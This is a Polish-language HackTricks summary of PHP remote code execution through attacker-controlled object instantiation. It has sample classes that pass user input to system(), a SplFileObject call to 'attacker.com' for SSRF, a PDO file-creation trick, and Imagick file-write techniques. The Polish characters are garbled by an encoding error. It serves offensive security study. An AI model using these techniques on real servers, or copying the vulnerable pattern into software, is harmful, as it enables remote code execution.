# PHP - RCE abusing object creation: new $\_GET\["a"]\($\_GET\["b"])

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

To jest zasadniczo podsumowanie [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

## Wprowadzenie

Tworzenie nowych, dowolnych obiekt贸w, takich jak `new $_GET["a"]($_GET["a"])`, mo偶e prowadzi do zdalnego wykonania kodu (RCE), jak szczeg贸owo opisano w [**artykule**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/). Dokument ten podkrela r贸偶ne strategie osigania RCE.

## RCE za pomoc klas niestandardowych lub autoloadingu

Skadnia `new $a($b)` jest u偶ywana do instancjonowania obiektu, gdzie **`$a`** reprezentuje nazw klasy, a **`$b`** jest pierwszym argumentem przekazywanym do konstruktora. Te zmienne mog pochodzi z danych wejciowych u偶ytkownika, takich jak GET/POST, gdzie mog by cigami lub tablicami, lub z JSON, gdzie mog wystpowa jako inne typy.

Rozwa偶 poni偶szy fragment kodu:
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

class App2 {
function App2 ($cmd) {
system($cmd);
}
}

$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
W tym przypadku ustawienie `$a` na `App` lub `App2` oraz `$b` na polecenie systemowe (np. `uname -a`) skutkuje wykonaniem tego polecenia.

**Funkcje autoloading** mog by wykorzystywane, jeli takie klasy nie s bezporednio dostpne. Te funkcje automatycznie aduj klasy z plik贸w w razie potrzeby i s definiowane za pomoc `spl_autoload_register` lub `__autoload`:
```php
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

function __autoload($class_name) {
include $class_name . '.php';
};

spl_autoload_register();
```
Zachowanie autoloadingu r贸偶ni si w zale偶noci od wersji PHP, oferujc r贸偶ne mo偶liwoci RCE.

## RCE za pomoc klas wbudowanych

Brakujc niestandardowych klas lub autoloader贸w, **wbudowane klasy PHP** mog wystarczy do RCE. Liczba tych klas waha si od 100 do 200, w zale偶noci od wersji PHP i rozszerze. Mo偶na je wylistowa za pomoc `get_declared_classes()`.

Konstruktory, kt贸re mog by interesujce, mo偶na zidentyfikowa za pomoc API refleksji, jak pokazano w poni偶szym przykadzie oraz w linku [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF).

**RCE za pomoc konkretnych metod obejmuje:**

### **SSRF + Deserializacja Phar**

Klasa `SplFileObject` umo偶liwia SSRF poprzez sw贸j konstruktor, pozwalajc na poczenia z dowolnym URL:
```php
new SplFileObject('http://attacker.com/');
```
SSRF mo偶e prowadzi do atak贸w deserializacji w wersjach PHP przed 8.0 przy u偶yciu protokou Phar.

### **Wykorzystywanie PDOs**

Konstruktor klasy PDO umo偶liwia poczenia z bazami danych za pomoc cig贸w DSN, co potencjalnie umo偶liwia tworzenie plik贸w lub inne interakcje:
```php
new PDO("sqlite:/tmp/test.txt")
```
### **SoapClient/SimpleXMLElement XXE**

Wersje PHP do 5.3.22 i 5.4.12 byy podatne na ataki XXE za porednictwem konstruktor贸w `SoapClient` i `SimpleXMLElement`, w zale偶noci od wersji libxml2.

## RCE za pomoc rozszerzenia Imagick

W analizie **zale偶noci projektu** odkryto, 偶e **Imagick** mo偶e by wykorzystany do **wykonywania polece** poprzez instancjonowanie nowych obiekt贸w. Stwarza to mo偶liwo wykorzystania luk w zabezpieczeniach.

### Parser VID

Zidentyfikowano zdolno parsera VID do zapisywania treci w dowolnie okrelonej cie偶ce w systemie plik贸w. Mo偶e to prowadzi do umieszczenia powoki PHP w katalogu dostpnym przez sie, osigajc zdalne wykonanie kodu (RCE).

#### Parser VID + Przesyanie plik贸w

Zauwa偶ono, 偶e PHP tymczasowo przechowuje przesyane pliki w `/tmp/phpXXXXXX`. Parser VID w Imagick, wykorzystujc protok贸 **msl**, mo偶e obsugiwa znaki wieloznaczne w cie偶kach plik贸w, co uatwia przeniesienie tymczasowego pliku do wybranej lokalizacji. Ta metoda oferuje dodatkowe podejcie do osignicia dowolnego zapisu plik贸w w systemie plik贸w.

### Awaria PHP + Brute Force

Metoda opisana w [**oryginalnym opisie**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) polega na przesyaniu plik贸w, kt贸re powoduj awari serwera przed usuniciem. Poprzez brute forcing nazwy tymczasowego pliku, mo偶liwe jest, aby Imagick wykona dowolny kod PHP. Jednak ta technika okazaa si skuteczna tylko w przestarzaej wersji ImageMagick.

## References

* [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
